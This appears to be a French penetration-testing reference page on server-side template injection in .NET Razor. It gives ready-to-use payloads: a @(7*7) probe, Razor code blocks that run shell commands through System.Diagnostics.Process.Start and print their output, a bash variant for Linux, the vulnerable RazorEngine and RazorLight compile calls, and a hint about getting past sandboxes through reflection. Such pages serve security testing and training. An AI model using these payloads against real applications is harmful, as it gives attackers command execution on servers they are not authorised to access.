---
title: "Injection de template côté serveur Razor"
description: "Exploiter la SSTI Razor en .NET : confirmation avec @(7*7), exécution de C# via les blocs @{ } vers System.Diagnostics.Process.Start, et le sink RunCompile de RazorEngine/RazorLight."
keywords:
  - SSTI Razor
  - RazorEngine RunCompile
  - Process.Start
  - RazorLight
  - injection de template .NET
---

# Razor

Razor compile les templates en C#, donc une injection dans la source du template exécute du C#. Confirmez avec `@(7*7)` affichant `49`. Un bloc de code fait ensuite appel à `System.Diagnostics` pour exécuter une commande :

```razor
@{
  System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
}
```

Pour capturer la sortie en vue de l'afficher, redirigez la sortie standard :

```razor
@{
  var p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c whoami";
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
}
@p.StandardOutput.ReadToEnd()
```

Sur du .NET hébergé sous Linux, remplacez `cmd.exe /c` par `/bin/bash -c`. Razor n'a pas de sandbox, donc une fois le C# en exécution, tout le framework est accessible (`System.IO.File` pour la lecture/écriture de fichiers, `System.Reflection` pour charger des assemblies).

Le sink qui rend cela exploitable est la compilation de l'entrée de l'attaquant comme template. Avec les bibliothèques autonomes, il s'agit de l'appel `RunCompile`/`Parse` sur une source non fiable :

```csharp
Engine.Razor.RunCompile(userInput, "key", null, model);   // RazorEngine
engine.CompileRenderStringAsync("key", userInput, model);  // RazorLight
```

Dans ASP.NET MVC, l'équivalent est une vue compilée à l'exécution dont le contenu est construit à partir de l'entrée utilisateur, ce qui est bien moins courant que le cas des bibliothèques. Comme toujours, les données passées à une vue fixe sont encodées en HTML et sûres ; la vulnérabilité exige que le texte du template lui-même soit contrôlé par l'attaquant. RazorEngine a un historique d'évasions de sandbox (la frontière `IsolatedRazorEngine` était contournable par réflexion), aussi même une configuration sandboxée justifie-t-elle de tester des chargements de `Process` par réflexion plutôt que de présumer du confinement.

## Outils

- SSTImap (support .NET limité) ; payloads manuels

## Références

- Documentation de la syntaxe Microsoft Razor ; projets RazorEngine et RazorLight
- PortSwigger Web Security Academy: Server-side template injection
